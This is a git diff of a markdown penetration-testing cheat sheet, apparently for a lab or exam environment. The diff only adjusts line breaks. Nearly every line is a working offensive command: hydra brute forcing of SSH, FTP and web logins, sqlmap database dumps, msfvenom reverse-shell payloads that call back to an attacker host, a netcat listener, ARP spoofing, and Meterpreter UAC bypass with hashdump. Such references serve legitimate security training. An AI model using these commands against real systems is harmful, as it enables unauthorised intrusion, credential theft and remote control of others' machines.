@@ -11,7 +11,7 @@ nmap -p<port> --script=vuln -v <target-IP>\
 fping -a -g 10.10.10.0/24 > targets 2>/dev/null\
 
 ### IP Route
-**Syntax**
+**Syntax**\
 *ip route add "Network-range" via "router-IP" dev <interface>*\
 eg.\
 ip route add 172.16.50.0/24 via 10.13.37.1 dev tap0\
@@ -26,10 +26,10 @@ dirb http://10.10.10.10/ \
 dirb http://10.10.10.10/dir -u admin:admin
 
 ### Netcat
-**Listening for reverse shell**
+**Listening for reverse shell**\
 nc -nvlp 1234
 
-**Banner Grabbing**
+**Banner Grabbing**\
 nc -nv 10.10.10.10 <port>
 
 ### SQLMap
@@ -54,7 +54,7 @@ sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dum
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump
 
 ### Hydra
-**SSH Login Bruteforcing**
+**SSH Login Bruteforcing**\
 hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh\
 hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh\
 *You can use same for FTP, just replace ssh with ftp*
@@ -66,19 +66,19 @@ hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh\
 *This is a great filter bypass cheatsheet*\
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
 
-**HTTP POST Form**
+**HTTP POST Form**\
 hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L /usr/share/ncrack/minimal.usr -P /root/Tools/SecLists/Passwords/Leaked-Databases/rockyou-15.txt -f -V
 
 *You will know which wordlists to use when the time comes*
 
 ### msfvenom shells
-**JSP Java Meterpreter Reverse TCP**
+**JSP Java Meterpreter Reverse TCP**\
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp
 
-**WAR**
+**WAR**\
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f war > shell.war
 
-**PHP**
+**PHP**\
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php\
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 
@@ -91,20 +91,20 @@ arpspoof -i <interface> -t <target> -r <host>\
 arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
 
 ### SMB Enumeration
-**Get shares, users, groups, password policy**
+**Get shares, users, groups, password policy**\
 smbclient -L //10.10.10.10/\
 enum4linux -U -M -S -P -G 10.10.10.10\
 nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 10.10.10.10 -p 135,139,445 -v\
-nmap -p445 --script=smb-vuln-* 10.10.10.10 -v\
+nmap -p445 --script=smb-vuln-* 10.10.10.10 -v
 
-**Access Share**
-smbclient //10.10.10.10/share_name\
+**Access Share**\
+smbclient //10.10.10.10/share_name
 
 ### FTP Enumeration
 nmap --script=ftp-anon 10.10.10.10 -p21 -v\
-nmap -A -p21 10.10.10.10 -v\
+nmap -A -p21 10.10.10.10 -v
 
-**Login to FTP server**
+**Login to FTP server**\
 ftp 10.10.10.10
 
 ### Meterpreter
@@ -112,30 +112,30 @@ ps\
 getuid\
 getpid\
 getsystem\
-ps -U SYSTEM\
+ps -U SYSTEM
 
-**CHECK UAC/Privileges**
-run post/windows/gather/win_privs\
+**CHECK UAC/Privileges**\
+run post/windows/gather/win_privs
 
-**BYPASS UAC**
+**BYPASS UAC**\
 *Background the session first*\
 exploit/windows/local/bypassuac\
-set session\
+set session
 
-**After PrivEsc**
+**After PrivEsc**\
 migrate <pid>\
-hashdump\
+hashdump
   
 ### Windows Command Line
-**To search for a file starting from current directory**
+**To search for a file starting from current directory**\
 dir /b/s "*.conf*\
-dir /b/s "*.txt*\
+dir /b/s "*.txt*
 
-**Check routing table**
+**Check routing table**\
 route print\
-netstat -r\
+netstat -r
 
-**Check Users**
-net users\
+**Check Users**\
+net users
 
 
